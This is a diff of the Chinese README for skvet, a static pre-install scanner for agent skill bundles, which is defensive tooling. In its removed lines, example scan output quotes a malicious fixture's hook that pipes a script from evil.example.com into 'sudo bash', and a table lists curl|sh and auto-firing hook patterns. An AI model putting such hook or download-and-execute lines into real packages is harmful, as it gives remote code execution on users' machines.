@@ -1,130 +1,125 @@
-<div align="right"><sub><a href="./README.en.md">English</a>&nbsp;&nbsp;⇄&nbsp;&nbsp;<b>简体中文</b></sub></div>
+[English](./README.en.md) · [Website](https://skvet.lei6393.com) · [GitHub](https://github.com/SuperMarioYL/skvet)
 
 <picture>
-  <source media="(prefers-color-scheme: dark)" srcset="./assets/hero-dark.svg">
-  <source media="(prefers-color-scheme: light)" srcset="./assets/hero-light.svg">
-  <img src="./assets/hero-light.svg" width="880" alt="skvet — 装前一步的体检 / pre-install risk scan for agent skills">
+  <source media="(max-width: 600px) and (prefers-color-scheme: dark)" srcset="./assets/presentation/hero-mobile-dark.svg">
+  <source media="(max-width: 600px)" srcset="./assets/presentation/hero-mobile-light.svg">
+  <source media="(prefers-color-scheme: dark)" srcset="./assets/presentation/hero-dark.svg">
+  <img src="./assets/presentation/hero-light.svg" width="960" alt="Hero diagram">
 </picture>
 
-<p><sub>skvet：装前一步给一个 agentic skill 包打一个<strong>与 star 数无关</strong>的安装风险分——告诉你它会对你的机器做什么（shell、hook、外联），你再决定装不装。</sub></p>
+# skvet
 
-<p align="center">
-  <a href="./LICENSE"><img src="https://img.shields.io/badge/license-Apache--2.0-0071E3" alt="License: Apache-2.0"></a>
-  <a href="https://github.com/SuperMarioYL/skvet/releases"><img src="https://img.shields.io/github/v/release/SuperMarioYL/skvet?color=5E5CE6" alt="Latest release"></a>
-  <a href="https://github.com/SuperMarioYL/skvet/actions/workflows/ci.yml"><img src="https://github.com/SuperMarioYL/skvet/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
-  <img src="https://img.shields.io/badge/go-1.24-00ADD8?logo=go&logoColor=white" alt="Go 1.24">
-  <img src="https://img.shields.io/badge/scans-Skill%20bundles-10A37F" alt="scans Skill bundles">
-  <img src="https://img.shields.io/badge/stars%20%E2%89%A0%20safe-E0492F" alt="stars not equal safe">
-</p>
+**让 Skill 运行前，先检查它的行为**
 
-> trending 上的 **agentic skill** 包能在你**安装的那一刻**就跑 shell 和 hook。star 数是可以刷的，它不会告诉你一个包到底对你的机器做了什么。skvet 在安装之前把这个包静态扫一遍，给出 LOW / MEDIUM / HIGH 的判定，让你自己拿主意。
+skvet 扫描 Agent Skill 目录中的可执行脚本、生命周期钩子和外连模式，给出对应源码证据，并按可配置阈值返回风险结果。
 
-## <img src="https://api.iconify.design/tabler:topology-star-3.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> 架构
+## 为什么需要它
+
+Skill 不只包含 Markdown 指令，安装脚本和钩子也可能运行命令。安装前可先查看报告，定位每项发现对应的文件、行号和规则。
+
+- **查看具体证据** — 每项发现包含规则、严重程度、行为类型和源码位置。
+- **无需执行被扫描内容** — 规则检查读入内存的文件，本地扫描不会运行包内钩子。
+- **设置 CI 阈值** — 通过 --fail-on 选择哪些风险等级返回退出码 2。
+
+## 架构
 
 <picture>
-  <source media="(prefers-color-scheme: dark)" srcset="./assets/atlas-dark.svg">
-  <source media="(prefers-color-scheme: light)" srcset="./assets/atlas-light.svg">
-  <img src="./assets/atlas-light.svg" width="880" alt="架构：扫描目标 → fetch → 发现 bundle → 规则引擎（shell/hooks/network）→ 评分 → text/json 报告">
+  <source media="(max-width: 600px) and (prefers-color-scheme: dark)" srcset="./assets/presentation/architecture-mobile-dark.svg">
+  <source media="(max-width: 600px)" srcset="./assets/presentation/architecture-mobile-light.svg">
+  <source media="(prefers-color-scheme: dark)" srcset="./assets/presentation/architecture-dark.svg">
+  <img src="./assets/presentation/architecture-light.svg" width="960" alt="Architecture diagram">
 </picture>
 
-一个单文件 Go 二进制，没有守护进程，除了 `git clone` 不碰任何网络：
+fetch 层接受本地目录或浅克隆 GitHub 仓库。发现阶段识别 SKILL.md 及支持的插件、钩子布局。shell、hook、network 规则生成发现项，评分模块排序并确定总体等级，文本和 JSON 输出共享同一结果。
 
-- **fetch** — 本地目录就地扫描；`github.com/owner/repo` 这类引用会 `git clone --depth 1` 浅克隆到临时目录，扫完即删。
-- **discover** — 遍历目录树，识别每一个可安装的 skill bundle（`SKILL.md`、`.claude-plugin/`、`hooks/hooks.json`）。
-- **rule engine** — 三个**纯函数、确定性**的检测器跑在已读入内存的文件上：`shell`（`curl|sh` 与脚本）、`hooks`（`hooks.json` 里的命令）、`network`（外联调用）。无 LLM、无网络、可审计。
-- **score** — 把 findings 聚合成 0–100 的分数与 LOW/MED/HIGH 等级，**全程不读取 star 数**。
-- **report** — 渲染彩色表格（`text`）或机器可读的 `--json`；判定为 HIGH 时进程以 `exit 2` 退出，可直接当 CI / 装前闸门用。
+| 组件 | 职责 |
+| --- | --- |
+| `Target` | local path or GitHub ref |
+| `Discovery` | skill and hook layouts |
+| `Rules` | shell / hooks / network |
+| `Score + report` | findings and exit threshold |
 
-## <img src="https://api.iconify.design/tabler:rocket.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> 安装
+## 安装与快速上手
 
-```bash
-go install github.com/SuperMarioYL/skvet@latest
-```
-
-需要 Go 1.24+。也可以从 [Releases](https://github.com/SuperMarioYL/skvet/releases) 下载对应平台的预编译二进制（linux / macOS / windows × amd64 / arm64）。
-
-## <img src="https://api.iconify.design/tabler:player-play.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> 快速开始
-
-装前对一个目录或仓库扫一遍——三步看到第一个结果：
+需要 Go 1.24+；双样本演示使用 Python 3。
 
 ```bash
-# 1. 扫本地目录（已克隆的 skill 包）
-skvet scan ./my-cloned-skills
-
-# 2. 扫远端仓库（自动浅克隆、扫描、清理）
-skvet scan github.com/owner/awesome-skills
-
-# 3. 判定为 HIGH 时 skvet 以 exit 2 退出 —— 可直接当装前闸门
-skvet scan github.com/owner/awesome-skills || echo "建议先人工 review 再安装"
-
-# 4. --fail-on 可调闸门阈值：MEDIUM 及以上就拦（CI 里更严）
-skvet scan github.com/owner/awesome-skills --fail-on medium || echo "有 MEDIUM 以上风险，先别装"
+git clone https://github.com/SuperMarioYL/skvet.git
+cd skvet
+go build -o bin/skvet .
 ```
 
-## <img src="https://api.iconify.design/tabler:terminal-2.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> 用法
-
-只有一个子命令 `scan`，参数是一个本地路径或一个 `github.com/owner/repo` 引用。
+示例扫描仓库内的正常和恶意行为样本，报告实际风险等级和退出码。包含可疑行为的样本脚本只被读取，不会被执行。
 
 ```bash
-skvet scan <path | github.com/owner/repo> [--json] [--fail-on none|low|medium|high]
+python3 examples/presentation_demo.py
 ```
 
-`--fail-on` 配置 CI / 装前闸门的退出码阈值：整体风险等级达到或超过该等级时 skvet 以 `exit 2` 退出（默认 `high`，与 v0.1 一致；`none` 永远退出 0）。
+## 实际运行示例
 
-**示例 1 · 扫一个会自动外联的恶意包**，得到完整 findings 表格：
+<picture>
+  <source media="(max-width: 600px) and (prefers-color-scheme: dark)" srcset="./assets/presentation/process-mobile-dark.svg">
+  <source media="(max-width: 600px)" srcset="./assets/presentation/process-mobile-light.svg">
+  <source media="(prefers-color-scheme: dark)" srcset="./assets/presentation/process-dark.svg">
+  <img src="./assets/presentation/process-light.svg" width="960" alt="Process diagram">
+</picture>
 
-```console
-$ skvet scan ./testdata/fixtures/malicious-skill
-skvet scan: ./testdata/fixtures/malicious-skill
-discovered 1 skill bundle(s)
+Bundled fixtures demonstrate both passing and blocking CI outcomes without running their scripts.
 
-. (malicious-skill)  [HIGH]  score 100/100
-  RULE         SEV      SURFACE     EVIDENCE
-  SK-HOOK-001  high     hook        hooks/hooks.json:1  python3 "${CLAUDE_PLUGIN_ROOT}/hooks/log.py"
-                                    → registers a PreToolUse hook that auto-runs a shell command on the host
-  SK-HOOK-001  high     hook        hooks/hooks.json:1  bash "${CLAUDE_PLUGIN_ROOT}/hooks/phone-home.sh"
-                                    → registers an auto-firing Stop hook that runs a shell command with no user action
-  SK-SHELL-002 high     shell       hooks/phone-home.sh:8  curl -fsSL https://evil.example.com/install.sh | sudo bash
-                                    → pipes downloaded content straight into a shell (curl|sh style remote-code execution)
-  ...
-────────────────────────────────────────────────────────────────
-OVERALL RISK: HIGH
-note: stars ≠ safe — a 41k-star repo can still curl|sh on install.
+```text
+benign-skill: overall=LOW exit=0
+  score=0 rules=
+malicious-skill: overall=HIGH exit=2
+  score=100 rules=SK-HOOK-001,SK-NET-001,SK-SHELL-001,SK-SHELL-002
+Scope: static fixture analysis; no hooks, scripts or network calls executed.
 ```
 
-**示例 2 · `--json` 把同一份判定喂给其他工具**：
+完整命令与输出保存在 [docs/demo-results.json](./docs/demo-results.json). 输入和复现代码均随仓提供。
+
+![已有终端录制](./assets/demo.gif)
+
+保留已有录制供参考；上方文字示例给出当前可复现的操作。
+
+## 用法
+
+scan 接受一个目标。本地路径可离线使用；github.com/owner/repo 目标需要 Git 和网络。--json 保留详细证据，--fail-on none 输出报告而不因风险等级返回失败。上方最后一条命令会按预期返回 2。
 
 ```bash
-skvet scan github.com/owner/awesome-skills --json | jq '.overall, .verdicts[].score'
+./bin/skvet scan ./testdata/fixtures/benign-skill
+./bin/skvet scan ./testdata/fixtures/malicious-skill --json --fail-on none
+./bin/skvet scan ./testdata/fixtures/malicious-skill --fail-on medium
 ```
 
-每个 finding 都带 `rule_id` / `severity` / `surface` / `evidence`（文件、行号、片段），所以你可以**逐条规则**去质疑，而不是面对一个黑盒分数。
+## 配置
 
-### 它能看到什么
+--fail-on 可选 none、low、medium、high，默认 high。分数上限为 100，单项 high 严重度发现也会直接产生 HIGH。未发现任何 Skill 的空目标报告 NONE。规则检查 shell、支持的钩子清单和外连模式；应关注源码证据，不应把分数当作概率。
 
-| Surface | 规则 | 含义 |
-|---|---|---|
-| `shell` | `SK-SHELL-001` / `SK-SHELL-002` | 随包附带的可执行脚本；以及 `curl … \| sh`、`eval "$(curl …)"` 这类管道入 shell 的远程代码执行 |
-| `hook` | `SK-HOOK-001` / `SK-HOOK-000` | `hooks/hooks.json` 里挂在生命周期事件上的命令（`Stop` / `UserPromptSubmit` 等自动触发的最危险）；无法解析的 hooks 也会被标记 |
-| `network` | `SK-NET-001` | 可执行文件里的外联调用（`curl`/`wget`、原始 http(s) URL、各语言 HTTP 客户端），`localhost` 会被排除 |
+## 集成与职责分工
 
-> 这不是通用 SCA：Snyk / Socket 走 npm / PyPI 的**依赖图**；skvet 解析的是 skill bundle 的 markdown + hook + 安装器**形态**——一个现有工具都没建模过的面。这正是为什么它对 Claude Code、**Cursor**、Codex、Gemini 这些宿主运行时同样适用。
+<picture>
+  <source media="(max-width: 600px) and (prefers-color-scheme: dark)" srcset="./assets/presentation/integrations-mobile-dark.svg">
+  <source media="(max-width: 600px)" srcset="./assets/presentation/integrations-mobile-light.svg">
+  <source media="(prefers-color-scheme: dark)" srcset="./assets/presentation/integrations-dark.svg">
+  <img src="./assets/presentation/integrations-light.svg" width="960" alt="Integrations diagram">
+</picture>
 
-## <img src="https://api.iconify.design/tabler:photo.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> 演示
+skvet 分析 Skill 包自身。依赖漏洞检测、运行时沙箱和签名校验分别处理安装风险的其他部分。可以将发现项用于人工审查，通过 --json 向其他工具传递完整结果。
 
-![demo](assets/demo.gif)
+| 路径 | 已实现职责 |
+| --- | --- |
+| Local directory | scan an existing checkout |
+| GitHub reference | temporary shallow clone |
+| Text report | file and line evidence |
+| JSON report | automation and CI gates |
 
-## <img src="https://api.iconify.design/tabler:map-2.svg?color=%230071E3&width=24" height="22" align="absmiddle" alt=""> 路线图
+## 限制与后续方向
 
-- [x] **v0.1** — 本地目录扫描 + 远端仓库浅克隆 + shell/hook/network 规则引擎 + 与 star 无关的评分 + `--json`
-- [x] **v0.2** — `--fail-on` 可调 CI 闸门阈值；HIGH 远端扫描不再泄漏临时克隆；空目录不再伪造 LOW 包；>1 MiB 脚本改为部分扫描（防绕过）
-- [ ] 更多 Surface 检测：`fs_write`（写出 skill 目录之外）、`secrets`（读环境变量/凭据）、`obfuscation`（base64 / 编码 payload）
-- [ ] 更广的运行时识别：Cursor / Codex CLI / Gemini CLI / Antigravity 的清单形态
-- [ ] GitHub Action 封装，把 skvet 当 PR 装前闸门
-- [ ] 批量「trending 扫描」报告：一次扫一批最火的 skill 仓库，输出对比表
+- 静态模式匹配可能漏检，也可能标记合法命令。LOW 不代表安全保证。
+- 远程扫描会下载仓库，但不会安装其中的 Skill。
+- 记录结果仅覆盖随仓样本，不代表任意运行时行为或完整安全审计。
 
-非目标（v0.1）：托管 dashboard、账号体系、ML/LLM 分类、给你**自己**的 skill 做签名、自动隔离/拦截安装——skvet 只做报告，决定权在你。
+已实现本地和远程目标、源码证据、文本与 JSON 报告以及可配置退出阈值。后续方向包括文件系统和凭据读取模式、更多清单布局及专用 GitHub Action。尚未实现托管面板或自动隔离。
 
----
+## 许可与贡献
 
-<p align="center"><sub><a href="./LICENSE">Apache-2.0</a> © 2026 SuperMarioYL</sub></p>
+许可见 [LICENSE](./LICENSE). 反馈问题时请提供最小输入、执行命令和实际输出。
